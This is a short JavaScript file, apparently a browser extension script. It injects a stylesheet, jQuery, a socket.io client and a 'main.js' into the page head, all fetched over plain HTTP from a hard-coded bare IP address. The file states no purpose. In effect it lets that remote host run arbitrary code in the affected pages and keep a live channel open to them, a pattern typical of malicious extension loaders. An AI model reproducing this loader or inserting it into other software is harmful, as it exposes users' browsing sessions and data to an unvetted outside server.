var injectScript = function(filename, callback) {
	var oHead = document.getElementsByTagName('HEAD').item(0);
	var oScript= document.createElement("script");
	oScript.type = "text/javascript";
	oScript.src = filename;
	oScript.onload = callback;
	oHead.appendChild(oScript);
};

var injectCssFile = function(filename) {
	var oHead = document.getElementsByTagName('HEAD').item(0);
	var oLink = document.createElement("link");
	oLink.href = filename
	oLink.type = "text/css";
	oLink.rel = "stylesheet";
	oHead.appendChild(oLink);
};

var host = 'http://92.63.109.20:8081';

injectCssFile(host + '/extension/main.css');

injectScript(host + '/extension/jquery-1.11.1.min.js', function() {
	injectScript(host + '/socket.io/socket.io.js');
	injectScript(host + '/extension/main.js');
});

